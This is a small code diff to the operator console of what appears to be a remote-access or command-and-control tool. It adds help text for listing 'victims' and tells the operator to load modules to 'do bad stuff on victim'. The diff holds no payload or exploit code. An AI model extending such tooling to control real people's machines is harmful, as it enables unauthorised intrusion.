@@ -33,6 +33,10 @@ class Victim:
 	## Shows the various victim present in the db/connected with the server. maybe dead or alive.
 	@classmethod
 	def show_victims(cls):
+		print(f"\nTo interact with a victim run {colored('use <victim_id>','cyan')}")
+		print("")
+		print("Victim IDs")
+		print("----------")
 		print('\n'.join(cls.victims.keys()))
 
 
@@ -101,9 +105,9 @@ class Victim:
 	## Displays the victim menu
 	def victim_menu(self):
 		self.display_victim_help_menu()
-
+		print(f"You are now interacting with the victim. To do bad stuff on victim, you might want to run {colored('modules','cyan')} commands to see the modules you can run and then use it by running '{colored('use <module_name>','cyan')}'")
 		while True:
-			print(colored("Enter victim based commands",'blue'))
+			print(colored("Enter victim based commands.",'blue'))
 			cmd = str(input())
 
 			if cmd == 'info':
